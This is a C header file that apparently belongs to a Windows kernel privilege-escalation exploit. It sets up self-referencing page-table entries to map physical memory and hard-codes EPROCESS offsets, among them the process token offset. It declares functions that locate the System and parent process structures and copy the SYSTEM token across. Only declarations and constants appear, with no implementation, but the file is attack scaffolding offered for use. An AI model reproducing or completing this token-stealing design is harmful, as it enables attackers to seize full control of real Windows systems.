#pragma once
#define PML4_BITS_SIZE 9
#define PDP_BITS_SIZE 9
#define PD_BITS_SIZE 9
#define PT_BITS_SIZE 9
#define OFFSET_IN_FRAME_BITS_SIZE 12

#define SIGN_EXTEND 0xFFFF000000000000ULL
#define SELF_REF_ENTRY 0x1EDULL

#define KERNEL_PML4_ENTRIES_START 0x100 // add our entry to the uppr half of the PML4 (the kernel half), it does not really matter we could add it to the usermode entries (the lower half) and will still work, as we are going to map only ~30GB.
#define TABLE_MAX_ENTRIES  0x200
#define ENTRY_SIZE 0x8
#define PAGE_SIZE 0x1000
#define HUGE_PAGE_SIZE 0x200000
#define MAP_START 0x10000
#define ENTRIES_TO_ADD 31

#define FLAGS 0x67
#define HUGE_PAGE_FLAGS 0xE7

#define PY_MEM_MASK 0x7FFFFFFFULL // anding with this gives us 30 bits (pdp+pd+offset)

#define PHMEM_REG_KEY L"Hardware\\ResourceMap\\System Resources\\Physical Memory"
#define PHMEM_REG_VALUE_NAME L".Translated"
typedef enum {
    PT = 1,
    PD,
    PDP,
    PML4
} paging_tables;

typedef struct {
    UWORD offset;
    union
    {
        UCHAR ImageFileName[15];
        DWORD PriorityClass;
        DWORDLONG ProcessLock;
        DWORDLONG UniqueProcessID;
    };
} _identifier;

typedef struct {
    _identifier identifers[4];
} identifiers;

typedef enum {
    ProcessLockOffset = 0x160,
    UniqueProcessIDOffset = 0x180,
    ImageFileNameOffset = 0x2e0,
    PriorityClassOffset = 0x2ef,
    TokenOffset = 0x208
} offsets;

typedef enum {
    ProcessLockIndex,
    UniqueProcessIDIndex,
    ImageFileNameIndex,
    PriorityClassIndex
};

typedef struct {
    DWORD64 start;
    DWORD64 size;
    DWORD64 end;
} memory_region;

typedef struct {
    DWORD64 count;
    memory_region* regions;
} memory_regions;

typedef struct {
    DWORD pid;
    UCHAR szExeFile[15];
} process_info;

typedef struct {
    DWORD64 system_eprocess;
    BOOL s_found;
    DWORD64 parent_process_eprocess;
    BOOL p_found;
} found_eprocess;

DWORD64 get_table_base_va(paging_tables);
VOID setup_pdp();
BOOL phmem_find_eprocess(found_eprocess*);
BOOL parse_phmem_regions(memory_regions*);
VOID search_memory(_identifier*, _identifier*, memory_regions, found_eprocess*);
BOOL get_parent_process(process_info*);
BOOL duplicate_token(DWORD64, DWORD64);

DWORD64 pml4, pdp, pd, pt;
UWORD added_entry = KERNEL_PML4_ENTRIES_START;